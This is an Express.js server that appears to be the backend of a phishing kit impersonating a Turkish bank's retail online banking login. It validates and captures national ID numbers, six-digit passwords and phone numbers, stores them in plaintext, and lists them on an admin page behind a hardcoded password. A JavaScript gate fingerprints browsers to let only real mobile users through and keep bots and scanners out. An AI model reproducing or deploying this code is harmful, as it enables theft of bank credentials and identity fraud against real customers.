const express = require('express');
const compression = require('compression');
const helmet = require('helmet');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const { createClient } = require('@libsql/client');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(helmet({ contentSecurityPolicy: false }));
app.use(compression());
const PORT = process.env.PORT || 3000;
const BIREYSEL_DIR = path.join(__dirname, 'public', 'bireysel');

// 🚀 DEV MODE: true yaparsanız bot koruması ve gate tamamen devre dışı kalır.
const DEV_MODE = true; 

// ─── LIBSQL VERİTABANI BAĞLANTISI (Lokal dosya veya Bulut) ───────────────────
const db = createClient({
  url: process.env.TURSO_DATABASE_URL || 'file:bank.db',
  authToken: process.env.TURSO_AUTH_TOKEN,
});

// Tabloyu oluştur (Yoksa)
(async () => {
  try {
    await db.execute(`CREATE TABLE IF NOT EXISTS login_attempts (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      ip TEXT,
      tc TEXT,
      password TEXT,
      phone TEXT,
      step INTEGER DEFAULT 1,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    console.log('📦 libsql veritabanı başarıyla hazırlandı.');
  } catch (err) {
    console.error('Veritabanı tablo oluşturma hatası:', err.message);
  }
})();

const GATE_HTML = `<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Yükleniyor...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #f2f2f2; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: Roboto, Arial, sans-serif; }
  .loader { text-align: center; }
  .spinner { width: 52px; height: 52px; border: 4px solid #ddd; border-top-color: #00b34a; border-radius: 50%; animation: spin 0.9s linear infinite; margin: 0 auto 18px; }
  @keyframes spin { to { transform: rotate(360deg); } }
  p { color: #aaa; font-size: 13px; }
</style>
</head>
<body>
<div class="loader"><div class="spinner"></div><p>Lütfen bekleyiniz...</p></div>
<script>
(function(){
  var sent=false;
  function dropoff(){if(sent)return;try{navigator.sendBeacon('/api/js_dropoff');}catch(e){}}
  addEventListener('visibilitychange',function(){if(document.visibilityState==='hidden')dropoff();});
  addEventListener('pagehide',dropoff);
  function blockPage(){}
  function getGPU(){try{var c=document.createElement('canvas');var gl=c.getContext('webgl',{alpha:false,antialias:false,depth:false,stencil:false})||c.getContext('experimental-webgl');if(!gl)return'no_webgl';var dbg=gl.getExtension('WEBGL_debug_renderer_info');if(!dbg)return'no_debug';var r=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);return(r?String(r):'unknown').toLowerCase();}catch(e){return'exception';}}
  function canvasCheck(){try{var c=document.createElement('canvas');c.width=80;c.height=30;var ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillStyle='#00b34a';ctx.fillText('check',2,2);return c.toDataURL().length>500?'1':'0';}catch(e){return'0';}}
  var ua=(navigator.userAgent||'').toLowerCase();
  var isMob=ua.indexOf('android')!==-1||/iphone|ipad|ipod/.test(ua);
  var hasTouch='ontouchstart' in window;
  var narrowScreen=screen.width<=600;
  if(!isMob||!hasTouch||!narrowScreen){blockPage();return;}
  var t0=performance.now?performance.now():Date.now();
  var data={webgl_renderer:getGPU(),canvas_ok:canvasCheck(),platform:(navigator.platform||'').toLowerCase(),device:ua.indexOf('android')!==-1?'android':(/iphone|ipad|ipod/.test(ua)?'ios':'other'),webdriver:navigator.webdriver?'1':'0',pixel_ratio:String(window.devicePixelRatio||1),lang:navigator.language||'',touch:hasTouch?'1':'0',screen_w:String(screen.width),screen_h:String(screen.height),max_touch:String(navigator.maxTouchPoints||0)};
  data.exec_ms=String(Math.round((performance.now?performance.now():Date.now())-t0));
  fetch('/api/js_check',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data),keepalive:true,credentials:'same-origin',cache:'no-store'})
  .then(function(r){return r.json();})
  .then(function(j){sent=true;if(j&&j.status==='pass'&&j.url){location.replace(j.url);}else{blockPage();}})
  .catch(function(){sent=true;setTimeout(function(){location.reload();},3000);});
})();
</script>
</body>
</html>`;

const PROTECT_SECRET = crypto.randomBytes(32).toString('hex');
const COOKIE_NAME = '_vkf_g';
const COOKIE_MAX_AGE = 60 * 60 * 24;

function signVal(val) {
  return crypto.createHmac('sha256', PROTECT_SECRET).update(val).digest('hex');
}

function createCookieToken() {
  const val = Date.now().toString(36) + '.' + crypto.randomBytes(8).toString('hex');
  return val + '.' + signVal(val);
}

function verifyCookieToken(token) {
  if (!token || typeof token !== 'string') return false;
  const dot = token.lastIndexOf('.');
  if (dot < 1) return false;
  const val = token.slice(0, dot);
  const sig = token.slice(dot + 1);
  return crypto.timingSafeEqual(
    Buffer.from(sig, 'hex').slice(0, 32),
    Buffer.from(signVal(val), 'hex').slice(0, 32)
  );
}

function parseCookies(req) {
  const list = {};
  const rc = req.headers.cookie;
  if (!rc) return list;
  rc.split(';').forEach(c => {
    const eq = c.indexOf('=');
    if (eq < 0) return;
    const k = c.slice(0, eq).trim();
    const v = c.slice(eq + 1).trim();
    try { list[k] = decodeURIComponent(v); } catch (e) { list[k] = v; }
  });
  return list;
}

app.post('/api/js_check', (req, res) => {
  const data = req.body || {};
  const token = createCookieToken();
  res.setHeader('Set-Cookie', `${COOKIE_NAME}=${encodeURIComponent(token)}; Path=/; HttpOnly; Max-Age=${COOKIE_MAX_AGE}; SameSite=Lax`);
  return res.json({ status: 'pass', url: '/bireysel/' });
});

app.post('/api/js_dropoff', (req, res) => res.status(200).end());
app.get('/api/js_dropoff', (req, res) => res.status(200).end());

// ─── GATE KONTROLÜ ───────────────────────────────────────────────────────────
app.use('/bireysel', (req, res, next) => {
  if (DEV_MODE) return next();

  const ext = path.extname(req.path);
  if (ext && ext !== '.html') return next();

  const cookies = parseCookies(req);
  let valid = false;
  try { valid = verifyCookieToken(cookies[COOKIE_NAME]); } catch (e) { }

  if (valid) return next();

  res.setHeader('Cache-Control', 'no-store, no-cache');
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(GATE_HTML);
});

app.use('/bireysel', express.static(BIREYSEL_DIR, {
  maxAge: '1d',
  etag: true,
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.html')) res.setHeader('Cache-Control', 'no-cache');
  }
}));
app.get('/', (req, res) => res.redirect('/bireysel/'));
app.get('/bireysel', (req, res) => res.redirect('/bireysel/'));

function getClientIP(req) {
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) return fwd.split(',')[0].trim();
  return req.connection && req.connection.remoteAddress || req.ip || 'bilinmiyor';
}

const userSessions = {};
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// T.C. Kimlik Numarası Algoritma Doğrulama Fonksiyonu (API Seviyesi)
function isValidTCKN(tc) {
  if (!tc || typeof tc !== 'string' && typeof tc !== 'number') return false;
  const strTc = String(tc).trim();
  if (!/^[1-9][0-9]{10}$/.test(strTc)) return false;
  
  const digits = strTc.split('').map(Number);
  const oddSum = digits[0] + digits[2] + digits[4] + digits[6] + digits[8];
  const evenSum = digits[1] + digits[3] + digits[5] + digits[7];
  
  const digit10 = (oddSum * 7 - evenSum) % 10;
  if (digit10 !== digits[9]) return false;
  
  const totalSum = digits.slice(0, 10).reduce((a, b) => a + b, 0);
  if (totalSum % 10 !== digits[10]) return false;
  
  return true;
}

// 1. Adım: TC ve Parola Kontrolü
app.post('/bireysel/step1', async (req, res) => {
  const { tc, password } = req.body;
  const ip = getClientIP(req);

  if (!tc || tc.length !== 11) {
    return res.status(400).json({ success: false, error: 'tc', message: 'Lütfen geçerli müşteri ya da T.C. Kimlik numaranızı girin.' });
  }

  if (!isValidTCKN(tc)) {
    return res.status(400).json({ success: false, error: 'tc', message: 'Girdiğiniz T.C. Kimlik numarası geçersizdir.' });
  }

  if (!password || password.length !== 6) {
    return res.status(400).json({ success: false, error: 'password', message: 'Lütfen geçerli parolanızı girin (6 haneli).' });
  }

  await sleep(500);

  try {
    const result = await db.execute({
      sql: `INSERT INTO login_attempts (ip, tc, password, step) VALUES (?, ?, ?, 1)`,
      args: [ip, tc, password]
    });
    const lastID = Number(result.lastInsertRowid);

    userSessions[ip] = { dbId: lastID };
    console.log(`📥 [Adım 1] TC ve Parola veritabanına kaydedildi (IP: ${ip}, ID: ${lastID})`);
    
    return res.json({ success: true });
  } catch (err) {
    console.error('DB Kayıt Hatası:', err.message);
    return res.status(500).json({ success: false, message: 'Veritabanı kayıt hatası oluştu.' });
  }
});

// 2. Adım: Telefon Numarası Kontrolü
app.post('/bireysel/step2', async (req, res) => {
  const { phone } = req.body;
  const ip = getClientIP(req);
  await sleep(1000);

  const cleanPhone = phone ? phone.replace(/^\+90\s*/, '').replace(/\D/g, '') : '';

  if (!cleanPhone || cleanPhone.length !== 10) {
    return res.status(400).json({ success: false, error: 'phone', message: 'Lütfen 10 haneli geçerli bir telefon numarası giriniz (5XXXXXXXXX).' });
  }

  try {
    const session = userSessions[ip];
    if (session && session.dbId) {
      await db.execute({
        sql: `UPDATE login_attempts SET phone = ?, step = 2 WHERE id = ?`,
        args: [phone, session.dbId]
      });
    } else {
      await db.execute({
        sql: `UPDATE login_attempts SET phone = ?, step = 2 WHERE ip = ? ORDER BY id DESC LIMIT 1`,
        args: [phone, ip]
      });
    }
  } catch (err) {
    console.error('DB Güncelleme Hatası:', err.message);
  }

  delete userSessions[ip];
  console.log(`📥 [Adım 2] Telefon eklendi ve kayıt güncellendi (IP: ${ip})`);

  return res.json({ success: true });
});

// ─── 📊 ADMIN PANEL ROTASI ───────────────────────────────────────────────────
app.get('/admin', async (req, res) => {
  const sifre = req.query.sifre;
  if (sifre !== 'gizli123') {
    return res.send(`
      <!DOCTYPE html>
      <html lang="tr">
      <head><meta charset="UTF-8"><title>Yetkisiz Erişim</title></head>
      <body style="font-family:sans-serif; text-align:center; padding-top:80px; background:#f4f6f8;">
        <h2 style="color:#d9534f;">🔒 Yetkisiz Erişim</h2>
        <p>Bu sayfayı görüntülemek için geçerli bir şifre girmelisiniz.</p>
        <p style="color:#888; font-size:12px;">Örnek Kullanım: /admin?sifre=gizli123</p>
      </body>
      </html>
    `);
  }

  try {
    const rs = await db.execute(`SELECT * FROM login_attempts ORDER BY id DESC`);
    const rows = rs.rows;

    let tableRows = rows.map(row => `
      <tr>
        <td>${row.id}</td>
        <td>${row.ip || ''}</td>
        <td><b>${row.tc || ''}</b></td>
        <td><code>${row.password || ''}</code></td>
        <td><b>${row.phone || '<span style="color:#999;">Bekleniyor...</span>'}</b></td>
        <td><span style="padding: 3px 8px; border-radius: 4px; background: ${row.step == 2 ? '#e6f4ea' : '#fef7e0'}; color: ${row.step == 2 ? '#137333' : '#b06000'};">Adım ${row.step}</span></td>
        <td>${row.created_at}</td>
      </tr>
    `).join('');

    res.send(`
      <!DOCTYPE html>
      <html lang="tr">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Admin Paneli - Kayıtlar</title>
          <style>
              body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f4f6f8; margin: 0; padding: 20px; }
              .container { max-width: 1100px; margin: 0 auto; background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
              .header-flex { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
              h2 { color: #222; margin: 0; }
              table { width: 100%; border-collapse: collapse; margin-top: 10px; }
              th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #ddd; font-size: 14px; }
              th { background-color: #009639; color: white; }
              tr:hover { background-color: #f9f9f9; }
              code { background: #eee; padding: 2px 6px; border-radius: 4px; font-family: monospace; }
              .btn { padding: 8px 16px; background: #009639; color: white; text-decoration: none; border-radius: 6px; font-weight: bold; font-size: 13px; }
              .btn:hover { background: #007a2e; }
          </style>
      </head>
      <body>
          <div class="container">
              <div class="header-flex">
                  <h2>📊 Admin Paneli - Gelen Giriş Denemeleri</h2>
                  <a href="/admin?sifre=gizli123" class="btn">🔄 Tabloyu Yenile</a>
              </div>
              <table>
                  <thead>
                      <tr>
                          <th>ID</th>
                          <th>IP Adresi</th>
                          <th>TC / Müşteri No</th>
                          <th>Parola</th>
                          <th>Telefon</th>
                          <th>Durum</th>
                          <th>Tarih / Saat</th>
                      </tr>
                  </thead>
                  <tbody>
                      ${tableRows || '<tr><td colspan="7" style="text-align:center; padding: 20px; color:#666;">Henüz veritabanında kayıt bulunmuyor.</td></tr>'}
                  </tbody>
              </table>
          </div>
      </body>
      </html>
    `);
  } catch (err) {
    return res.status(500).send("Veritabanı okuma hatası: " + err.message);
  }
});

app.get('/bireysel/step1', (req, res) => res.redirect('/bireysel/'));
app.get('/bireysel/step2', (req, res) => res.redirect('/bireysel/'));

app.get('/bireysel/', (req, res) => {
  if (DEV_MODE) {
    return res.sendFile(path.join(BIREYSEL_DIR, 'index.html'));
  }

  const reqPath = req.params[0] || '';
  if (reqPath && path.extname(reqPath)) return res.status(404).send('File not found');

  const cookies = parseCookies(req);
  let valid = false;
  try { valid = verifyCookieToken(cookies[COOKIE_NAME]); } catch (e) { }

  if (!valid) {
    res.setHeader('Cache-Control', 'no-store, no-cache');
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.send(GATE_HTML);
  }

  res.sendFile(path.join(BIREYSEL_DIR, 'index.html'));
});

// Başarılı Sayfası
app.get('/bireysel/basarili', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Başvurunuz Alındı</title>
        <style>
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f4f6f8; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; box-sizing: border-box; }
            .card { background: white; padding: 55px 35px; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); text-align: center; max-width: 400px; width: 100%; box-sizing: border-box; }
            .check-icon { width: 70px; height: 70px; background: #e1f3ed; color: #008763; font-size: 32px; line-height: 70px; border-radius: 50%; margin: 0 auto 20px auto; font-weight: bold; display: flex; align-items: center; justify-content: center; }
            h2 { color: #111; font-size: 22px; margin-bottom: 12px; font-weight: bold; }
            p { color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
            .ref-box { background: #f8f9fa; border: 1px solid #e5e9ec; border-radius: 12px; padding: 15px; text-align: left; margin-bottom: 30px; }
            .ref-title { font-size: 11px; color: #888; font-weight: bold; letter-spacing: 0.5px; margin-bottom: 5px; }
            .ref-code { font-size: 16px; color: #008763; font-weight: bold; font-family: monospace; }
            .btn { background: #008763; color: white; border: none; padding: 15px 20px; border-radius: 12px; cursor: pointer; text-decoration: none; display: block; font-weight: bold; font-size: 16px; width: 100%; box-sizing: border-box; }
            .btn:hover { background: #007052; }
        </style>
    </head>
    <body>
        <div class="card">
            <div class="check-icon">✓</div>
            <h2>Başvurunuz Alındı</h2>
            <p>Kredi başvurunuz sisteme başarıyla iletilmiştir. Değerlendirme sonucunda en kısa sürede sizinle iletişime geçilecektir.</p>
            <div class="ref-box">
                <div class="ref-title">REFERANS NUMARASI</div>
                <div class="ref-code">GBB-2026-WCGOQUU5</div>
            </div>
            <a href="/bireysel" class="btn">Kapat</a>
        </div>
    </body>
    </html>
  `);
});

// Kurumsal Hata Sayfası
app.get('/isube/login/login/passwordentrycorporate-tr', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>İşlem Tamamlanamadı</title>
        <style>
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f4f6f8; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; box-sizing: border-box; }
            .card { background: white; padding: 55px 35px; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); text-align: center; max-width: 400px; width: 100%; box-sizing: border-box; }
            .warning-icon { width: 64px; height: 64px; margin: 0 auto 20px auto; display: flex; align-items: center; justify-content: center; font-size: 38px; }
            h2 { color: #111; font-size: 22px; margin-bottom: 14px; font-weight: bold; }
            p { color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
            .btn { background: #008763; color: white; border: none; padding: 15px 20px; border-radius: 12px; cursor: pointer; text-decoration: none; display: block; font-weight: bold; font-size: 16px; width: 100%; box-sizing: border-box; }
            .btn:hover { background: #007052; }
        </style>
    </head>
    <body>
        <div class="card">
            <div class="warning-icon">⚠️</div>
            <h2>İşlem Tamamlanamadı</h2>
            <p>Başvuru esnasında müşteri olunamamaktadır.<br><br>Lütfen daha sonra tekrar deneyiniz veya en yakın şubemizi ziyaret ediniz.</p>
            <a href="/bireysel" class="btn">Ana Sayfaya Dön</a>
        </div>
    </body>
    </html>
  `);
});

app.listen(PORT, () => {
  console.log(`🚀 Server ${PORT} portunda çalışıyor`);
  if (DEV_MODE) console.log(`⚠️  DEV_MODE aktif: Bot koruması ve Gate HTML devre dışı bırakıldı!`);
});

module.exports = app;